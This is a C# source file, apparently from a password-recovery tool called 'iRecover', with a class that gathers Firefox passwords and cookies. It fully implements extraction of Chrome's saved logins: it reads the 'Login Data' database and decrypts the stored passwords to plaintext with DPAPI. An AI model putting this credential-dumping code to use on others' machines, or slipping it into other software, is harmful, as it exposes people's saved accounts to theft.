using System;
using System.Collections.Generic;
using System.Text;
using System.Data.SQLite;
using System.Security.Cryptography;

namespace iRecover
{
    public static class Browsers
    {
        public static List<FirefoxPassword> FireFoxPassword()
        {
            List<FirefoxPassword> firefoxPasswords = Firefox.Passwords();
            return firefoxPasswords;
        }

        public static List<FirefoxCookie> FireFoxCookies()
        {
            List<FirefoxCookie> firefoxCookies = Firefox.Cookies();
            return firefoxCookies;
        }

        public static List<string> ChromePassword()
        {
            List<string> passes = new List<string>();
            var dataPath = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data\Default\Login Data";
            var sqliteConnection = new SQLiteConnection("Data Source=" + dataPath + ";Version=3;New=True;Compress=True;");
            var sqliteCommand = sqliteConnection.CreateCommand();

            sqliteCommand.CommandText = "select Origin_URL, Username_value, Password_value from logins";
            sqliteConnection.Open();
            var sqliteDatareader = sqliteCommand.ExecuteReader();

            while (sqliteDatareader.Read())
            {
                string url = (string)sqliteDatareader["Origin_URL"];
                string usr = (string)sqliteDatareader["Username_value"];
                byte[] pwd = (byte[])sqliteDatareader["Password_value"];
                byte[] decrypted = ProtectedData.Unprotect(pwd, null, DataProtectionScope.CurrentUser);
                if (decrypted.Length > 0)
                    passes.Add(url + " :: "+usr  +":" + Encoding.Default.GetString(decrypted));
            }
            sqliteConnection.Close();
            return passes;
        }
    }
}

